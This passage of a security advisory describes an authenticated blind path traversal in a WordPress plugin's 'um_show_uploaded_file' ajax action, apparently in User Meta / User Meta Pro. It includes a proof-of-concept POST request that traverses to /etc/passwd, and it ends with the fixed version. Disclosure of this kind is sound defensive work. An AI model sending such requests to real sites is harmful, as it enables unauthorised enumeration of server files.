(from the vendor's homepage)


5. VULNERABILITY DETAILS
========================
The WordPress ajax action "um_show_uploaded_file" is vulnerable to an
authenticated path traversal when user-supplied input to the HTTP POST
parameter "filepath" is processed by the web application. Since the
application does not properly validate and sanitize this parameter,
it is possible to enumerate local server files using a blind approach.
This is because the application doesn't return the contents of the
referenced file but instead returns different form elements based on
whether a file exists or not.

The following Proof-of-Concept triggers this vulnerability:

POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Length: 147
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: [your-wordpress-auth-cookies]
Connection: close

field_name=[your-field-name]&filepath=/../../../../../etc/passwd&field_id=[your-field-id]&form_key=[your-form-key]&action=um_show_uploaded_file&pf_nonce=[your-auth-nonce]&is_ajax=true


6. RISK
=======
The vulnerability can be used by an authenticated attacker to enumerate
local server files based on a blind approach.


7. SOLUTION
===========
Update to User Meta/User Meta Pro 2.4.4
